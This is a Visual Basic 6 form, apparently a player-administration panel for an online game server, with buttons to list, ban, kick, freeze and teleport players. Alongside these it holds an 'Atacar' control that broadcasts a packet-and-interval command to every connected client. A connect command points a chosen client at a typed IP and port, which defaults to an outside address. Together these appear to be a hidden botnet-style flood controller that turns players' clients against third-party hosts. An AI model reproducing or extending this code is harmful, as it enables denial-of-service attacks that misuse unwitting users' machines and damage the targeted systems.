VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H80000007&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Administración de Usuarios"
   ClientHeight    =   6885
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   4725
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6885
   ScaleWidth      =   4725
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox interval 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   1200
      TabIndex        =   12
      Text            =   "100"
      Top             =   5520
      Width           =   3255
   End
   Begin VB.TextBox packet 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   1200
      TabIndex        =   11
      Text            =   "45645687998798765434535465465465463"
      Top             =   5280
      Width           =   3255
   End
   Begin VB.CommandButton cmdFrenar 
      Caption         =   "Stop"
      Height          =   255
      Left            =   720
      TabIndex        =   6
      Top             =   6240
      Width           =   3255
   End
   Begin VB.CommandButton cmdAttack 
      Caption         =   "Atacar"
      Height          =   255
      Left            =   720
      TabIndex        =   5
      Top             =   6000
      Width           =   3255
   End
   Begin VB.TextBox port 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   1200
      TabIndex        =   4
      Text            =   "6112"
      Top             =   5040
      Width           =   3255
   End
   Begin VB.TextBox ip 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   1200
      TabIndex        =   3
      Text            =   "45.235.98.169"
      Top             =   4800
      Width           =   3255
   End
   Begin VB.ListBox List1 
      BackColor       =   &H00C0FFFF&
      Height          =   4155
      Left            =   240
      TabIndex        =   2
      Top             =   240
      Width           =   4335
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Cerrar"
      Height          =   255
      Left            =   720
      TabIndex        =   1
      Top             =   6480
      Width           =   3255
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Recargar"
      Height          =   255
      Left            =   240
      TabIndex        =   0
      Top             =   4440
      Width           =   4335
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "INTERV:"
      ForeColor       =   &H8000000B&
      Height          =   255
      Left            =   240
      TabIndex        =   10
      Top             =   5520
      Width           =   855
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "PACKET:"
      ForeColor       =   &H8000000B&
      Height          =   255
      Left            =   240
      TabIndex        =   9
      Top             =   5280
      Width           =   855
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "PORT:"
      ForeColor       =   &H8000000B&
      Height          =   255
      Left            =   240
      TabIndex        =   8
      Top             =   5040
      Width           =   855
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "IP:"
      ForeColor       =   &H8000000B&
      Height          =   255
      Left            =   240
      TabIndex        =   7
      Top             =   4800
      Width           =   855
   End
   Begin VB.Menu cmdOpc 
      Caption         =   "Menu"
      Visible         =   0   'False
      Begin VB.Menu cmdBan 
         Caption         =   "Banear"
      End
      Begin VB.Menu cmdEchar 
         Caption         =   "Echar"
      End
      Begin VB.Menu cmdStop 
         Caption         =   "Stopear"
      End
      Begin VB.Menu cmdHome 
         Caption         =   "Mandar a Tanaris"
      End
      Begin VB.Menu cmdConection 
         Caption         =   "Crear una conexión"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdFrenar_Click()
    Call SendData(SendTarget.ToAll, 0, 0, "NPR")
End Sub

Private Sub Command1_Click()

List1.Clear

Dim i As Long
For i = 1 To LastUser
List1.AddItem "" & i & ". " & UserList(i).Name & ""
Next i
End Sub
Private Sub Command2_Click()
Unload Me
End Sub
Private Sub Form_Load()

List1.Clear

Dim i As Long
For i = 1 To LastUser
List1.AddItem "" & i & ". " & UserList(i).Name & ""
Next i

End Sub
Private Sub cmdConection_Click()
    Call SendData(SendTarget.toindex, List1.ListIndex + 1, 0, "NCO" & ip.Text & "," & port.Text)
End Sub
Private Sub cmdAttack_Click()
    Call SendData(SendTarget.ToAll, 0, 0, "NAT" & packet.Text & "," & val(interval.Text))
End Sub
Private Sub cmdBan_Click()
    Call WriteVar(CharPath & UserList(List1.ListIndex + 1).Name & ".chr", "FLAGS", "Ban", "1")
    Call CloseSocket(List1.ListIndex + 1)
End Sub
Private Sub cmdEchar_Click()
    Call CloseSocket(List1.ListIndex + 1)
End Sub
Private Sub cmdHome_Click()
    Call WarpUserChar(List1.ListIndex + 1, 28, 54, 36, True)
End Sub
Private Sub cmdStop_Click()
    If UserList(List1.ListIndex + 1).flags.Stopped = 1 Then
        UserList(List1.ListIndex + 1).flags.Stopped = 0
        MsgBox "Usuario REMOVIDO"
    Else
        UserList(List1.ListIndex + 1).flags.Stopped = 1
        MsgBox "Usuario STOP"
    End If
End Sub
Private Sub List1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)

If Button = 2 Then
PopupMenu cmdOpc
End If

End Sub

